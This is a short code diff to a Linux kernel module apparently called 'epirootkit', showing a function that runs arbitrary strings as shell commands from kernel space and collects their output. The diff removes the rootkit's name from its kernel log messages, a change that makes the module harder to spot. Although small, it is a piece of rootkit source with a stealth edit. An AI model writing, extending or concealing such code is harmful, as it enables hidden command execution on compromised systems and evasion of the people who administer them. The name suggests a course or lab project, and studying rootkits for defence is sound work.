@@ -68,7 +68,7 @@ int exec_str_as_command(char *user_cmd){
 	// Prepare the command arguments
 	argv[2] = cmd;
 
-	pr_info("epirootkit: exec_str_as_command: executing command: %s\n", cmd);
+	pr_info("exec_str_as_command: executing command: %s\n", cmd);
 
 	// Prepare to run the command
 	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
@@ -79,7 +79,7 @@ int exec_str_as_command(char *user_cmd){
 
 	// Execute the command and wait for it to finish
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
-	pr_info("epirootkit: exec_str_as_command: command exited with status: %d\n", status);
+	pr_info("exec_str_as_command: command exited with status: %d\n", status);
 
 	// Retieve stdout and stderr
 	char *stdout_content = read_file(stdout_file);
